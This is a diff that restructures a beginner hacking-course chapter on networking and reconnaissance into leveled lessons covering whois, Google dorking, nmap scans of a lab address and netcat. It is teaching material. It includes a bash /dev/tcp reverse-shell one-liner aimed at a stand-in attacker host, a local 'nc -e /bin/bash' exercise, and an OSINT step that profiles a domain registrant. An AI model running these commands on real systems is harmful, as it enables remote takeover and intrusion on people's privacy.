@@ -1,60 +1,80 @@
 # Chapter 6: Networking & Reconnaissance
 
-## 6.1 The Language of the Internet (TCP/IP)
-Hacking is often just manipulating network traffic.
+## Core Concepts & Definitions
+**Networking** is how computers talk. **Reconnaissance** is gathering intelligence before an attack.
 
-### The TCP 3-Way Handshake
-Before data sends, a connection must be established. This is polite networking.
+**Key Terminology:**
+*   **IP Address:** The logical address of a machine (`192.168.1.1`).
+*   **Port:** An address for a specific service (`80` for Web, `22` for SSH).
+*   **Protocol:** The rules of communication (TCP, UDP, ICMP).
+*   **WHOIS:** A database of domain owners.
 
-<!-- Placeholder: [Image: tcp_handshake.png] - SYN, SYN-ACK, ACK flow diagram -->
+---
 
-1.  **SYN:** Client sends "Hello, I want to talk" (Synchronization).
-2.  **SYN-ACK:** Server sends "Okay, I'm listening" (Synchronization + Acknowledgment).
-3.  **ACK:** Client sends "Great, let's start" (Acknowledgment).
+## Level 1: Fundamentals
+**Goal:** Gather information without touching the target server.
 
-*   **CTF Tip:** A "SYN Scan" (Nmap default) sends step 1. If it gets step 2 back, the port is open. It never sends step 3, making it slightly stealthier.
+### 1.1 Passive Recon (OSINT)
+Using public information.
+*   **Google Dorking:** Advanced searches.
+    *   `site:target.com filetype:pdf` -> Finds leaked PDF documents.
+*   **Wayback Machine:** Viewing deleted pages of a website.
 
-### Subnetting (CIDR Notation)
-*   `192.168.1.0/24`: The "slash 24" means the first 24 bits (3 octets) are fixed.
-    *   IPs range from `192.168.1.1` to `192.168.1.254`.
-*   `127.0.0.1`: Localhost (Your own computer).
+### 1.2 `ping` and `whois`
+*   `ping google.com`: "Are you alive?" Checks connectivity (ICMP).
+*   `whois google.com`: "Who owns you?" Checks registration info.
 
-## 6.2 Reconnaissance (Enumeration)
-"Give me six hours to chop down a tree and I will spend the first four sharpening the axe." - Abraham Lincoln.
+### Practice 1.1: The Digital Detective
+**Scenario:** You investigate `megacorp.com`.
+1.  Run `whois megacorp.com`.
+2.  Find the "Registrant Name" or "Admin Email".
+3.  Google that email to find social media profiles.
 
-### Active Scanning with Nmap
-Nmap is the King of Scanners.
+**Challenge Question 1:** What does `tracert` (Windows) or `traceroute` (Linux) do? (It maps every hop/router between you and the target).
 
-<!-- Placeholder: [Image: nmap_scan_types.png] - Visualizing different scan techniques -->
+---
 
-#### Step-by-Step: Enumerating a Target
-**Target:** `10.10.10.5`
+## Level 2: Intermediate
+**Goal:** Map the target's attack surface with Nmap.
 
-1.  **Quick Scan:**
-    *   Command: `nmap -sC -sV 10.10.10.5`
-    *   `-sC`: Use default scripts (finds titles, headers).
-    *   `-sV`: Probe open ports to determine service/version info.
-2.  **Full Port Scan:**
-    *   Command: `nmap -p- 10.10.10.5`
-    *   Scans all 65,535 ports. Critical if SSH is hidden on port 2222.
-3.  **UDP Scan:**
-    *   Command: `nmap -sU 10.10.10.5`
-    *   Slow, but finds things like SNMP or TFTP.
+### 2.1 Nmap (Network Mapper)
+The gold standard scanner.
+*   **Scan Types:**
+    *   `-sS` (SYN Scan): Stealthy (Step 1 & 2 of handshake).
+    *   `-sV` (Version): "Which Apache version is running?"
+    *   `-p-` (All ports): Scan 1-65535.
 
-### Directory Busting (Web Recon)
-Finding hidden folders on a web server.
-*   **Tools:** `gobuster`, `dirb`, `dirsearch`.
-*   **Concept:** The tool has a list of words (`admin`, `login`, `backup`). It asks the server: "Do you have /admin?".
-*   **Command:** `gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirb/common.txt`
+### Practice 2.1: The Cartographer
+**Scenario:** Target IP `10.10.10.5`.
+1.  Run `nmap -sV -sC 10.10.10.5`.
+2.  Output:
+    *   `Port 22`: OpenSSH 7.2.
+    *   `Port 80`: Apache 2.4.18.
+3.  Analysis: Search `Exploit-DB` for "Apache 2.4.18 vulnerabilities".
 
-## 6.3 The Swiss Army Knife: Netcat
-Netcat (`nc`) reads and writes data across network connections.
+**Challenge Question 2:** Why might a firewall block a "Ping" (`ICMP`) but allow a Web request (`TCP 80`)? (Security policy often blocks ICMP to hide presence, but Web must be open for business).
 
-*   **Connect to a port:** `nc [IP] [PORT]`
-    *   Example: `nc 10.10.10.5 1337` (Connect to a challenge service).
-*   **Listen on a port:** `nc -lvnp [PORT]`
-    *   `-l`: Listen mode.
-    *   `-v`: Verbose.
-    *   `-n`: No DNS lookup (faster).
-    *   `-p`: Port number.
-    *   Example: `nc -lvnp 4444` (Waiting for a reverse shell to connect back to you).
+---
+
+## Level 3: Advanced
+**Goal:** Establish Command & Control (C2) with Netcat.
+
+### 3.1 Netcat (`nc`)
+The "Swiss Army Knife". It reads and writes TCP/UDP connections.
+*   **Connect:** `nc [IP] [PORT]` -> Acts like a browser/client.
+*   **Listen:** `nc -lvnp [PORT]` -> Acts like a server.
+
+### 3.2 The Reverse Shell
+The "Holy Grail" of hacking.
+1.  **Attacker:** Starts a listener. `nc -lvnp 4444`.
+2.  **Victim:** Runs a command that connects BACK to the attacker and gives them a shell (`/bin/sh`).
+    *   Command: `bash -i >& /dev/tcp/attacker_ip/4444 0>&1`
+3.  **Result:** Attacker sees a command prompt of the victim machine.
+
+### Practice 3.1: Catching a Shell
+**Task:** Simulate a reverse shell locally.
+1.  Terminal 1 (Attacker): `nc -lvnp 9001`
+2.  Terminal 2 (Victim): `nc 127.0.0.1 9001 -e /bin/bash`
+3.  Go back to Terminal 1. Type `ls`. You should see the files!
+
+**Challenge Question 3:** What is a "Bind Shell"? (The opposite of Reverse Shell; the victim opens a port and listens, attacker connects to them. Less common due to firewalls blocking incoming ports).
